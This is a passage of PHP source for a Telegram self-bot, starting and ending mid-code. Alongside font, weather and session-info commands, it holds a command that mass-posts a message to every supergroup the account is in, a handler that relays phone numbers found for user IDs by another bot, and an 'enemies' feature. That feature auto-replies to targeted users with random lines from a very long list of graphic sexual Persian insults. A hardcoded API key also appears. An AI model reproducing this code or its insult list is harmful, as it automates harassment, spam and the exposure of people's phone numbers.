                        $Pawn86 = $link2['86'];
                        $Pawn87 = $link2['87'];
                        $Pawn88 = $link2['88'];
                        $Pawn89 = $link2['89'];
                        $Pawn90 = $link2['90'];
                        $Pawn91 = $link2['91'];
                        $Pawn92 = $link2['92'];
                        $Pawn93 = $link2['93'];
                        $Pawn94 = $link2['94'];
                        $Pawn95 = $link2['95'];
                        $Pawn96 = $link2['96'];
                        $Pawn97 = $link2['97'];
                        $Pawn98 = $link2['98'];
                        $Pawn99 = $link2['99'];
                        $Pawn100 = $link2['100'];
                        $Pawn101 = $link2['101'];
                        $Pawn102 = $link2['102'];
                        $Pawn103 = $link2['103'];
                        $Pawn104 = $link2['104'];
                        $Pawn105 = $link2['105'];
                        $Pawn106 = $link2['106'];
                        $Pawn107 = $link2['107'];
                        $Pawn108 = $link2['108'];
                        $Pawn109 = $link2['109'];
                        $Pawn110 = $link2['110'];
                        $Pawn111 = $link2['111'];
                        $Pawn112 = $link2['112'];
                        $Pawn113 = $link2['113'];
                        $Pawn114 = $link2['114'];
                        $Pawn115 = $link2['115'];
                        $Pawn116 = $link2['116'];
                        $Pawn117 = $link2['117'];
                        $Pawn118 = $link2['118'];
                        $Pawn119 = $link2['119'];
                        $Pawn120 = $link2['120'];
                        $Pawn121 = $link2['121'];
                        $Pawn122 = $link2['122'];
                        $Pawn123 = $link2['123'];
                        $Pawn124 = $link2['124'];
                        $Pawn125 = $link2['125'];
                        $Pawn126 = $link2['126'];
                        $Pawn127 = $link2['127'];
                        $Pawn128 = $link2['128'];
                        $Pawn129 = $link2['129'];
                        $Pawn130 = $link2['130'];
                        $Pawn131 = $link2['131'];
                        $Pawn132 = $link2['132'];
                        $Pawn133 = $link2['133'];
                        $Pawn134 = $link2['134'];
                        $Pawn135 = $link2['135'];
                        $Pawn136 = $link2['136'];
                        $Pawn137 = $link2['137'];
                        $Pawn138 = $link2['138'];

                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
≡ فونت های انگلیسی کلمه $query طراحی تعداد به 138 فونت : 
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
1 => ️`$Pawn1`
2 => `$Pawn2`
3 => `$Pawn3`
4 => `$Pawn4`
5 => `$Pawn5`
6 => `$Pawn6`
7 => `$Pawn7`
8 => `$Pawn8`
9 => `$Pawn9`
10 => `$Pawn10`
11 => `$Pawn11`
12 => `$Pawn12`
13 => `$Pawn13`
14 => `$Pawn14`
15 => `$Pawn15`
16 => `$Pawn16`
17 => `$Pawn17`
18 => `$Pawn18`
19 => `$Pawn19`
20 => `$Pawn20`
21 => `$Pawn21`
22 => `$Pawn22`
23 => `$Pawn23`
24 => `$Pawn24`
25 => `$Pawn25`
25 => `$Pawn26`
27 => `$Pawn27`
28 => `$Pawn28`
29 => `$Pawn29`
30 => `$Pawn30`
31 => `$Pawn31`
32 => `$Pawn32`
33 => `$Pawn33`
34 => `$Pawn34`
35 => `$Pawn35`
36 => `$Pawn36`
37 => `$Pawn37`
38 => `$Pawn38`
39 => `$Pawn39`
40 => `$Pawn40`
41 => `$Pawn41`
42 => `$Pawn42`
43 => `$Pawn43`
44 => `$Pawn44`
45 => `$Pawn45`
46 => `$Pawn46`
47 => `$Pawn47`
48 => `$Pawn48`
49 => `$Pawn49`
50 => `$Pawn50`
51 => `$Pawn51`
52 => `$Pawn52`
53 => `$Pawn53`
54 => `$Pawn54`
55 => `$Pawn55`
56 => `$Pawn56`
57 => `$Pawn57`
58 => `$Pawn58`
59 => `$Pawn59`
60 => `$Pawn60`
61 => `$Pawn61`
62 => `$Pawn62`
63 => `$Pawn63`
64 => `$Pawn64`
65 => `$Pawn65`
66 => `$Pawn66`
67 => `$Pawn67`
68 => `$Pawn68`
69 => `$Pawn69`
70 => `$Pawn70`
71 => `$Pawn71`
72 =>`$Pawn72`
73 => `$Pawn73`
74 => `$Pawn74`
75 => `$Pawn75`
76 => `$Pawn76`
77 => `$Pawn77`
78 => `$Pawn78`
79 => `$Pawn79`
80 => `$Pawn80`
81 => `$Pawn81`
82 => `$Pawn82`
83 => `$Pawn83`
84 => `$Pawn84`
85 => `$Pawn85`
86 => `$Pawn86`
87 => `$Pawn87`
88 => `$Pawn88`
89 => `$Pawn89`
90 => `$Pawn90`
91 => `$Pawn91`
92 => `$Pawn92`
93 => `$Pawn93`
94 => `$Pawn94`
95 => `$Pawn95`
96 => `$Pawn96`
97 => `$Pawn97`
98 => `$Pawn98`
99 => `$Pawn99`
100 => `$Pawn100`
101 => `$Pawn101`
102 => `$Pawn102`
103 => `$Pawn103`
104 => `$Pawn104`
105 => `$Pawn105`
106 => `$Pawn106`
107 => `$Pawn107`
108 => `$Pawn108`
109 => `$Pawn109`
110 => `$Pawn110`
111 => `$Pawn111`
112 => `$Pawn112`
113 => `$Pawn113`
114 => `$Pawn114`
115 => `$Pawn115`
116 => `$Pawn116`
117 => `$Pawn117`
118 => `$Pawn118`
119 => `$Pawn119`
120 => `$Pawn120`
121 => `$Pawn121`
122 => `$Pawn122`
123 => `$Pawn123`
124 => `$Pawn124`
125 => `$Pawn125`
126 => `$Pawn126`
127 => `$Pawn127`
128 => `$Pawn128`
129 => `$Pawn129`
130 => `$Pawn130`
131 => `$Pawn131`
132 => `$Pawn132`
133 => `$Pawn133`
134 => `$Pawn134`
135 => `$Pawn135`
136 => `$Pawn136`
137 => `$Pawn137`
138 => `$Pawn138`
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(sendgps) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(sendgps) (.*)$/si", $text, $match);

                        yield $this->messages->sendMessage([
                            'peer' => $peer,
                            'message' => "**֍ 𝒔𝒆𝒏𝒅𝒊𝒏𝒈**", 'parse_mode' => 'Markdown']);

                        $dialogs = yield $this->getDialogs();
                        $i = 0;
                        foreach ($dialogs as $peer) {
                            try {
                                $type = yield $this->getInfo($peer)['type'];
                                if ($type == 'supergroup') {
                                    yield $this->messages->sendMessage([
                                        'peer' => $peer,
                                        'message' => $match[2]
                                    ]);
                                    $i++;
                                }
                            } catch (\Throwable $e) {

                            }

                        }
                        yield $this->messages->sendMessage([
                            'peer' => $peer,
                            'message' => "**֍ 𝑷𝒖𝒃𝒍𝒊𝒄 𝒔𝒖𝒃𝒎𝒊𝒔𝒔𝒊𝒐𝒏 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒔𝒆𝒏𝒕 𝒕𝒐 𝒔𝒖𝒑𝒆𝒓𝒈𝒓𝒐𝒖𝒑𝒔 👌🏻**\n**𝑵𝒖𝒎𝒃𝒆𝒓 𝒐𝒇 𝒔𝒖𝒃𝒎𝒊𝒔𝒔𝒊𝒐𝒏𝒔 :** $i", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(weather) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(weather) (.*)$/si", $text, $m);
                        $query = $m[2];
                        $url = json_decode(yield $this->fileGetContents("http://api.openweathermap.org/data/2.5/weather?q=" . $query . "&appid=eedbc05ba060c787ab0614cad1f2e12b&units=metric"), true);
                        $city = $url["name"];
                        $deg = $url["main"]["temp"];
                        $type1 = $url["weather"][0]["main"];
                        if ($type1 == "Clear") {
                            $tpp = 'آفتابی☀';
                            yield $this->filePutContents('type.txt', $tpp);
                        } elseif ($type1 == "Clouds") {
                            $tpp = 'ابری ☁☁';
                            yield $this->filePutContents('type.txt', $tpp);
                        } elseif ($type1 == "Rain") {
                            $tpp = 'بارانی ☔';
                            yield $this->filePutContents('type.txt', $tpp);
                        } elseif ($type1 == "Thunderstorm") {
                            $tpp = 'طوفانی ☔☔☔☔';
                            yield $this->filePutContents('type.txt', $tpp);
                        } elseif ($type1 == "Mist") {
                            $tpp = 'مه 💨';
                            yield $this->filePutContents('type.txt', $tpp);
                        }
                        if ($city != '') {
                            $ziro = file_get_contents('type.txt');
                            $txt = "دمای شهر $city هم اکنون $deg درجه سانتی گراد می باشد

شرایط فعلی آب و هوا: $ziro";
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt]);
                            unlink('type.txt');
                        } else {
                            $txt = "⚠️شهر مورد نظر شما يافت نشد";
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(sessions)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ 𝑹𝒆𝒄𝒆𝒊𝒗𝒊𝒏𝒈** [𝒂𝒄𝒄𝒐𝒖𝒏𝒕](mention:$fromId) **𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏 ...!**", 'parse_mode' => 'Markdown']);
                        $authorizations = yield $this->account->getAuthorizations();
                        $txxt = "";
                        foreach ($authorizations['authorizations'] as $authorization) {
                            $txxt .= "
هش: " . $authorization['hash'] . "
مدل دستگاه: " . $authorization['device_model'] . "
سیستم عامل: " . $authorization['platform'] . "
ورژن سیستم: " . $authorization['system_version'] . "
api_id: " . $authorization['api_id'] . "
app_name: " . $authorization['app_name'] . "
نسخه برنامه: " . $authorization['app_version'] . "
تاریخ ایجاد: " . date("Y-m-d H:i:s", $authorization['date_active']) . "
تاریخ فعال: " . date("Y-m-d H:i:s", $authorization['date_active']) . "
آی‌پی: " . $authorization['ip'] . "
کشور: " . $authorization['country'] . "
منطقه: " . $authorization['region'] . "

====================";
                        }
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $txxt]);
                        yield $this->filePutContents('Sessions.txt', "$txxt");
                    }
                    if (preg_match("/^[\/\#\!]?(gpinfo)$/si", $text)) {
                        $peer_inf = yield $this->getFullInfo($message['to_id']);
                        $peer_info = $peer_inf['Chat'];
                        $peer_id = $peer_info['id'];
                        $peer_title = $peer_info['title'];
                        $peer_type = $peer_inf['type'];
                        $peer_count = $peer_inf['full']['participants_count'];
                        $des = $peer_inf['full']['about'];
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ 𝑹𝒆𝒄𝒆𝒊𝒗𝒊𝒏𝒈 𝒈𝒓𝒐𝒖𝒑 𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏 ...!**", 'parse_mode' => 'Markdown']);
                        $mes = "**𝑰𝑫:** $peer_id \n\n**𝑻𝒊𝒕𝒍𝒆:** $peer_title \n\n**𝑻𝒚𝒑𝒆:** $peer_type \n\n**𝑴𝒆𝒎𝒃𝒆𝒓𝒔 𝑪𝒐𝒖𝒏𝒕:** $peer_count \n\n**𝑩𝒊𝒐:** $des";
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $mes, 'parse_mode' => 'Markdown']);
                    }
                }
            }
            if ($data['power'] == "on") {
                if ($fromId != $owner) {

                    $typing = yield $this->getLocalContents("typing.txt");
                    $gameplay = yield $this->getLocalContents("gameplay.txt");
                    $audioaction = yield $this->getLocalContents("audioaction.txt");
                    $videoaction = yield $this->getLocalContents("videoaction.txt");
                    $gameplaypv = yield $this->getLocalContents("gamepv.txt");
                    $markread = yield $this->getLocalContents("markread.txt");
                    $lockpv = yield $this->getLocalContents("lockpv.txt");
                    $lockgp = yield $this->getLocalContents("lockgp.txt");
                    $lockmedia = yield $this->getLocalContents("lockmedia.txt");
                    $antilogin = yield $this->getLocalContents("antilogin.txt");
                    $locklink = yield $this->getLocalContents("locklink.txt");
                    $locktag = yield $this->getLocalContents("locktag.txt");
                    $lockvia = yield $this->getLocalContents("lockvia.txt");
                    $autochat = yield $this->getLocalContents("autochat.txt");
                    $lockphoto = yield $this->getLocalContents("lockphoto.txt");
                    $lockmention = yield $this->getLocalContents("lockmention.txt");
                    $lockforward = yield $this->getLocalContents("lockforward.txt");

                    if ($message && $typing == 'on' && $update['_'] == "updateNewChannelMessage") {
                        $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
                    }
                    if ($message && $gameplay == 'on' && $update['_'] == "updateNewChannelMessage") {
                        $sendMessageGamePlayAction = ['_' => 'sendMessageGamePlayAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGamePlayAction]);
                    }
                    if ($message && $audioaction == 'on' && $update['_'] == "updateNewChannelMessage") {
                        $sendMessageRecordAudioAction = ['_' => 'sendMessageRecordAudioAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordAudioAction]);
                    }
                    if ($message && $videoaction == 'on' && $update['_'] == "updateNewChannelMessage") {
                        $sendMessageRecordVideoAction = ['_' => 'sendMessageRecordVideoAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordVideoAction]);
                    }
                    if ($gameplaypv == 'on') {
                        $sendMessageGamePlayAction = ['_' => 'sendMessageGamePlayAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGamePlayAction]);
                    }
                    if ($message && $data['echo'] == "on") {
                        yield $this->messages->forwardMessages(['from_peer' => $peer, 'to_peer' => $peer, 'id' => [$message['id']]]);
                    }
                    if ($message && $markread == 'on') {
                        if (intval($peer) < 0) {
                            yield $this->channels->readHistory(['channel' => $peer, 'max_id' => $message['id']]);
                            yield $this->channels->readMessageContents(['channel' => $peer, 'id' => [$message['id']]]);
                        } else {
                            yield $this->messages->readHistory(['peer' => $peer, 'max_id' => $message['id']]);
                        }
                    }
                    if (strpos($text, '😐') !== false and $data['poker'] == "on") {
                        yield $this->sleep(3);
                        $this->messages->sendMessage(['peer' => $peer, 'message' => '😐', 'reply_to_msg_id' => $message['id']]);
                    }
                    if (strpos($text, "✅ #شماره_پیدا_شد") !== false && $fromId == 1565231209) {
                        $text2 = explode("\n", $text)[2];
                        $e1 = str_replace("☎️ شماره : ", "", $text2);
                        $msgsgs = yield $this->getLocalContents("msgid25.txt");
                        $perer = yield $this->getLocalContents("peer5.txt");
                        $e = yield $this->getLocalContents("id.txt");
                        yield $this->messages->editMessage(['peer' => $perer, 'id' => $msgsgs, 'message' => "» شماره تلفن : `$e1`
» آیدی عددی : `$e`", 'parse_mode' => 'markdown']);
                        unlink("msgid25.txt");
                        unlink("peer5.txt");
                        unlink("id.txt");
                    }

                    if (strpos($text, "❌ #شماره_پیدا_نشد") !== false && $fromId == 1565231209) {
                        $msgsgs = yield $this->getLocalContents("msgid25.txt");
                        $perer = yield $this->getLocalContents("peer5.txt");
                        $e = yield $this->getLocalContents("id.txt");
                        yield $this->messages->editMessage(['peer' => $perer, 'id' => $msgsgs, 'message' => "» شماره پیدا نشد ! «",
                            'parse_mode' => 'markdown']);
                        unlink("msgid25.txt");
                        unlink("peer5.txt");
                        unlink("id.txt");
                    }

                    if ($type3 == 'user') {
                        if ($text == $text and $lockpv == 'on') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "شما به دلیل فعال بودن حالت Lockpv بلاک شدید!"]);
                            yield $this->messages->sendMessage(['peer' => $owner, 'message' => "کاربر $peer به دلیل روشن بودن حالت lockpv بلاک شد!"]);
                            yield $this->contacts->block(['id' => $peer]);
                        }
                    }

                    $fohsh = [
                        "کیرم کون مادرت😂😂😂😂", "بالا باش کیرم کص مادرت😂😂😂", "مادرتو میگام نوچه جون بالا😂😂😂", "اب خارکصته تند تند تایپ کن ببینم", "مادرتو میگام بخای فرار کنی", "لال شو دیگه نوچه", "مادرتو میگام اف بشی", "کیرم کون مادرت", "کیرم کص مص مادرت بالا", "کیرم تو چشو چال مادرت", "کون مادرتو میگام بالا", "بیناموس  خسته شدی؟", "نبینم خسته بشی بیناموس", "ننتو میکنم", "کیرم کون مادرت 😂😂😂😂😂😂😂", "صلف تو کصننت بالا", "بیناموس بالا باش بهت میگم", "کیر تو مادرت", "کص مص مادرتو بلیسم؟", "کص مادرتو چنگ بزنم؟", "به خدا کصننت بالا ", "مادرتو میگام ", "کیرم کون مادرت بیناموس", "مادرجنده بالا باش", "بیناموس تا کی میخای سطحت گح باشه", "اپدیت شو بیناموس خز بود", "ای تورک خر بالا ببینم", "و اما تو بیناموس چموش", "تو یکیو مادرتو میکنم", "کیرم تو ناموصت ", "کیر تو ننت", "ریش روحانی تو ننت", "کیر تو مادرت😂😂😂", "کص مادرتو مجر بدم", "صلف تو ننت", "بات تو ننت ", "مامانتو میکنم بالا", "وای این تورک خرو", "سطحشو نگا", "تایپ کن بیناموس", "خشاب؟", "کیرم کون مادرت بالا", "بیناموس نبینم خسته بشی", "مادرتو بگام؟", "گح تو سطحت شرفت رف", "بیناموس شرفتو نابود کردم یه کاری کن", "وای کیرم تو سطحت", "بیناموس روانی شدی", "روانیت کردما", "مادرتو کردم کاری کن", "تایپ تو ننت", "بیپدر بالا باش", "و اما تو لر خر", "ننتو میکنم بالا باش", "کیرم لب مادرت بالا😂😂😂", "چطوره بزنم نصلتو گح کنم", "داری تظاهر میکنی ارومی ولی مادرتو کوص کردم", "مادرتو کردم بیغیرت", "هرزه", "وای خدای من اینو نگا", "کیر تو کصننت", "ننتو بلیسم", "منو نگا بیناموس", "کیر تو ننت بسه دیگه", "خسته شدی؟", "ننتو میکنم خسته بشی", "وای دلم کون مادرت بگام", "اف شو احمق", "بیشرف اف شو بهت میگم", "مامان جنده اف شو", "کص مامانت اف شو", "کص لش وا ول کن اینجوری بگو؟", "ای بیناموس چموش", "خارکوصته ای ها", "مامانتو میکنم اف نشی", "گح تو ننت", "سطح یه گح صفتو", "گح کردم تو نصلتا", "چه رویی داری بیناموس", "ناموستو کردم", "رو کص مادرت کیر کنم؟😂😂😂", "نوچه بالا", "کیرم تو ناموصتاا😂😂", "یا مادرتو میگام یا اف میشی", "لالشو دیگه", "بیناموس", "مادرکصته", "ناموص کصده", "وای بدو ببینم میرسی", "کیرم کون مادرت چیکار میکنی اخه", "خارکصته بالا دیگه عه", "کیرم کصمادرت😂😂😂", "کیرم کون ناموصد😂😂😂", "بیناموس من خودم خسته شدم توچی؟", "ای شرف ندار", "مامانتو کردم بیغیرت", "و اما مادر جندت", "تو یکی زیر باش", "اف شو", "خارتو کوص میکنم", "کوصناموصد", "ناموص کونی", "خارکصته ی بۍ غیرت", "شرم کن بیناموس", "مامانتو کرد ", "ای مادرجنده", "بیغیرت", "کیرتو ناموصت", "بیناموس نمیخای اف بشی؟", "ای خارکوصته", "لالشو دیگه", "همه کس کونی", "حرامزاده", "مادرتو میکنم", "بیناموس", "کصشر", "اف شو مادرکوصته", "خارکصته کجایی", "ننتو کردم کاری نمیکنی؟", "کیرتو مادرت لال", "کیرتو ننت بسه", "کیرتو شرفت", "مادرتو میگام بالا", "کیر تو مادرت"
                        , "کونی ننه ی حقیر زاده", "وقتی تو کص ننت تلمبه های سرعتی میزدم تو کمرم بودی بعد الان برا بکنه ننت شاخ میشی هعی   ", "تو یه کص ننه ای ک ننتو به من هدیه کردی تا خایه مالیمو کنی مگ نه خخخخ", "انگشت فاکم تو کونه ناموست", "تخته سیاهه مدرسه با معادلات ریاضیه روش تو کص ننت اصلا خخخخخخخ ", "کیرم تا ته خشک خشک با کمی فلفل روش تو کص خارت ", "کص ننت به صورت ضربدری ", "کص خارت به صورت مستطیلی", "رشته کوه آلپ به صورت زنجیره ای تو کص نسلت خخخخ ", "10 دقیقه بیشتر ابم میریخت تو کس ننت این نمیشدی", "فکر کردی ننت یه بار بهمـ داده دیگه شاخی", "اگر ننتو خوب کرده بودم حالا تو اینجوری نمیشدی"
                        , "حروم لقمع", "ننه سگ ناموس", "منو ننت شما همه چچچچ", "ننه کیر قاپ زن", "ننع اوبی", "ننه کیر دزد", "ننه کیونی", "ننه کصپاره", "زنا زادع", "کیر سگ تو کص نتت پخخخ", "ولد زنا", "ننه خیابونی", "هیس بع کس حساسیت دارم", "کص نگو ننه سگ که میکنمتتاااا", "کص نن جندت", "ننه سگ", "ننه کونی", "ننه زیرابی", "بکن ننتم", "ننع فاسد", "ننه ساکر", "کس ننع بدخواه", "نگاییدم", "مادر سگ", "ننع شرطی", "گی ننع", "بابات شاشیدتت چچچچچچ", "ننه ماهر", "حرومزاده", "ننه کص", "کص ننت باو", "پدر سگ", "سیک کن کص ننت نبینمت", "کونده", "ننه ولو", "ننه سگ", "مادر جنده", "کص کپک زدع", "ننع لنگی", "ننه خیراتی", "سجده کن سگ ننع", "ننه خیابونی", "ننه کارتونی", "تکرار میکنم کص ننت", "تلگرام تو کس ننت", "کص خوارت", "خوار کیونی", "پا بزن چچچچچ", "مادرتو گاییدم", "گوز ننع", "کیرم تو دهن ننت", "ننع همگانی", "کیرم تو کص زیدت", "کیر تو ممهای ابجیت", "ابجی سگ", "کس دست ریدی با تایپ کردنت چچچ", "ابجی جنده", "ننع سگ سیبیل", "بده بکنیم چچچچ", "کص ناموس", "شل ناموس", "ریدم پس کلت چچچچچ", "ننه شل", "ننع قسطی", "ننه ول", "دست و پا نزن کس ننع", "ننه ولو", "خوارتو گاییدم", "محوی!؟", "ننت خوبع!؟", "کس زنت", "شاش ننع", "ننه حیاطی", "نن غسلی", "کیرم تو کس ننت بگو مرسی چچچچ", "ابم تو کص ننت", "فاک یور مادر خوار سگ پخخخ", "کیر سگ تو کص ننت", "کص زن", "ننه فراری", "بکن ننتم من باو جمع کن ننه جنده /:::", "ننه جنده بیا واسم ساک بزن", "حرف نزن که نکنمت هااا :|", "کیر تو کص ننت😐", "کص کص کص ننت😂", "کصصصص ننت جووون", "سگ ننع", "کص خوارت", "کیری فیس", "کلع کیری", "تیز باش سیک کن نبینمت", "فلج تیز باش چچچ", "بیا ننتو ببر", "بکن ننتم باو ", "کیرم تو بدخواه", "چچچچچچچ", "ننه جنده", "ننه کص طلا", "ننه کون طلا", "کس ننت بزارم بخندیم!؟", "کیرم دهنت", "مادر خراب", "ننه کونی", "هر چی گفتی تو کص ننت خخخخخخخ", "کص ناموست بای", "کص ننت بای ://", "کص ناموست باعی تخخخخخ", "کون گلابی!", "ریدی آب قطع", "کص کن ننتم کع", "نن کونی", "نن خوشمزه", "ننه لوس", " نن یه چشم ", "ننه چاقال", "ننه جینده", "ننه حرصی ", "نن لشی", "ننه ساکر", "نن تخمی", "ننه بی هویت", "نن کس", "نن سکسی", "نن فراری", "لش ننه", "سگ ننه", "شل ننه", "ننه تخمی", "ننه تونلی", "ننه کوون", "نن خشگل", "نن جنده", "نن ول ", "نن سکسی", "نن لش", "کس نن ", "نن کون", "نن رایگان", "نن خاردار", "ننه کیر سوار", "نن پفیوز", "نن محوی", "ننه بگایی", "ننه بمبی", "ننه الکسیس", "نن خیابونی", "نن عنی", "نن ساپورتی", "نن لاشخور", "ننه طلا", "ننه عمومی", "ننه هر جایی", "نن دیوث", "تخخخخخخخخخ", "نن ریدنی", "نن بی وجود", "ننه سیکی", "ننه کییر", "نن گشاد", "نن پولی", "نن ول", "نن هرزه", "نن دهاتی", "ننه ویندوزی", "نن تایپی", "نن برقی", "نن شاشی", "ننه درازی", "شل ننع", "یکن ننتم که", "کس خوار بدخواه", "آب چاقال", "ننه جریده", "ننه سگ سفید", "آب کون", "ننه 85", "ننه سوپری", "بخورش", "کس ن", "خوارتو گاییدم", "خارکسده", "گی پدر", "آب چاقال", "زنا زاده", "زن جنده", "سگ پدر", "مادر جنده", "ننع کیر خور", "چچچچچ", "تیز بالا", "ننه سگو با کسشر در میره", "کیر سگ تو کص ننت", "kos kesh", "kiri", "nane lashi", "kos", "kharet", "blis kirmo", "دهاتی", "کیرم لا کص خارت", "کص ننت", "  مادر کونی مادر کص خطا کار کیر ب کون بابات ش تیز باش خرررررر خارتو از‌کص‌گایید نباص شاخ شی کص‌ننت چس‌پدر خارتو ننت زیر‌کیرم‌پناهنده شدن افصوص میخورم واصت ک خایه نداری از ننت دفاع کنی افصوص میخورم واصت ک خایه نداری از ننت دفاع کنی سسسسسسگ ننتو از کچن‌کرد نباص شاخ شی مادر کون خطا سیک کن تو کص خارت بی ناموس مادر‌کص‌جق شده کص ننت سالهای سالها بالا بیناموص خار کیر شده بالا باش بخندم ب کص خارت بالا باش بخندم ب کص خارت پصرم تو هیچ موقع ب من نمیرصی مادر هیز کص افی بیا کیرمو با خودت ببر بع کص ننت وقتی از ترس من میری اونجابرو تو کص خارت کص ننت سالهای سالها بالا کونی کیر به مادره خودتو کصی تورو شاخ کرد بردکونتو بده ", " خارکصه  خارجنده  کیرم دهنت  مادر کونی  مادر کص خطا کار  کیر ب کون بابات ش تیز باش  خرررررر خارتو از‌کص‌گایید نباص شاخ شی  افصوص میخورم واصت ک خایه نداری از ننت دفاع کنی  سسسسسسگ ننتو از کچن‌کرد نباص شاخ شی  بی ناموس مادر‌کص‌جق شده  کص ننت سالهای سالها بالا  خار خیز تخم خر  ننه کص مهتابی  ننه کص تیز  ننه کیر خورده شده  مادر هیز کص افی  بالا باش بخندم ب کص خارت  افصوص میخورم واصت ک خایه نداری از ننت دفاع کنی  پصرم تو هیچ موقع ب من نمیرصی  ننه کصو  کوصکش  کونده  پدرسگ  پدرکونی  پدرجنده  مادرت داره بهم میدع  کیرم تو ریش بابات  مداد تو کص مادرت  کیر خر تو کونت  کیر خر تو کص مادرت  کیر خر تو کص خواهرت ", "تونل تو کص ننت", "ننه خرکی", "خوار کصده", "ننه کصو", "مادر بيبي بالا باش ميخوام مادرت رو جوري بگام ديگه لب خند نياد رو لباش", "کیری ننه", "منو ننت شما همه چچچچ", "ولد زنا بی ننه", "میزنم ننتو کص‌پر میکنم ک ‌شاخ‌ نشی", "بی خودو بی جهت کص‌ننت", "صگ‌ممبر اوب مادر تیز باش", "بيناموص بالا باش  يه درصد هم فکر نکن ولت ميکنم", "اخخههه میدونصی خارت هی کص‌میده؟؟؟", "کیر سگ تو کص نتت پخخخ", "راهی نی داش کص ننت", "پا بزن یتیمک کص خل", "هیس بع کس حساسیت دارم", "کص نگو ننه سگ که میکنمتتاااا", "کص نن جندت", "ای‌کیرم ب ننت", "کص‌خارت تیز باش", "اتایپم تو کص‌ننت جا شه  ", "بکن ننتم", "کیرمو کردم‌کص‌ننت هار شدی؟", "انقد ضعیف نباش چصک", "مادر فلش شده جوری با کیر‌میزنم ب فرق سر ننت ک حافظش بپره", "خیلی اتفاقی کیرم‌ب خارت", "یهویی کص‌ننتو بکنم؟؟؟", "مادر بیمه ایی‌کص‌ننتو میگام", "بیا کیرمو بگیر بلیص شاید فرجی شد ننت از زیر کیرم فرار کنه", "بابات شاشیدتت چچچچچچ", "حیف کیرم‌که کص ننت کنم", "مادر‌کص شکلاتی تیز تر باش", "بیناموص زیر نباش مادر کالج رفته", "کص ننت باو", "همت کنی کیرمو بخوری", "سیک کن کص ننت نبینمت", "ناموص اختاپوص رو ننت قفلم‌میفمی؟؟؟؟", "کیر هافبک دفاعی تیم فرانسه که اصمش‌ یادم نی ب کص‌ننت", "برص و بالا باش خار‌کصه", "مادر جنده", "داش میخام چوب بیصبال رو تو کون ننت کنم محو نشو:||", "خار‌کص شهوتی نباید شاخ میشدی", "خخخخخخخخههههخخخخخخخ کص‌ننت بره پا بزن داداش", "سجده کن سگ ننع", "کیرم از چهار جهت فرعی یراص تو کص‌ناموصت", "داش برص راهی نی کیری شاخ شدی", "تکرار میکنم کص ننت", "تلگرام تو کس ننت", "کص خوارت", "کیر‌ب سردر دهاتتون واص من شاخ میشی", "پا بزن چچچچچ", "مادرتو گاییدم", "بدو برص تا خایهامو تا ته نکردم‌تو کص‌ننت", "کیرم تو دهن ننت", "کص‌ننت ول کن خایهامو راهی نی باید ننت بکنم", "کیرم تو کص زیدت", "کیر تو ممهای ابجیت", "بی‌ننه‌ ممبر خار بیمار", "تو کیفیت کار‌منو زیر‌سوال میبریچچ", "داش تو خودت خاسی بیناموص شی میفمی؟؟", "داش تو در‌میری ولی‌مادرت چی؟؟؟", "خارتو با کیر میزنم‌تو صورتش جوری ک‌با دیورا بحرفه", "ننه کیر‌خور تو ب کص‌خارت خندیدی شاخیدی", "بالا باش تایپ بده بخندم‌بهت", "ریدم پس کلت چچچچچ", "بالا باش کیرمو ناخودآگاه تو کص‌ننت کنم", "ننت ب زیرم  واس درد کیرم", "خیخیخیخیخخیخخیخیخخییخیخیخخ", "دست و پا نزن کس ننع", "الهی خارتو بکنم‌ بی خار ممبر", "مادرت از کص‌جر‌بدم ‌ک ‌دیگ نشاخی؟؟؟ننه لاشی", "ممه", "کص", "کیر", "بی خایه", "ننه لش", "بی پدرمادر", "خارکصده", "مادر جنده", "کصکش"
                    ];
                    if (in_array($fromId, $data['enemies'])) {
                        $f = $fohsh[rand(0, count($fohsh) - 1)];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => $f, 'reply_to_msg_id' => $msg_id]);
                    }
                    if (in_array($fromId, $data['muted'])) {
                        if (in_array($type3, ['channel', 'supergroup'])) {
                            yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                        } else {
                            yield $this->messages->deleteMessages(['revoke' => true, 'id' => [$msg_id]]);
                        }
                    }


                    if (isset($data['answering'][$text])) {
                        yield $this->sleep(3);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => $data['answering'][$text], 'reply_to_msg_id' => $msg_id]);
                    }
                    if ($lockgp == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['media']['document']) || isset($update['message']['media']['photo']) || $text !== false) {
                                yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            }
                        }
                    }

                    if ($lockmedia == 'on') {
                        if (in_array((yield $this->getInfo($update))['type'], ['chat', 'supergroup'])) {
                            if (isset($update['message']['media']['_'])) {
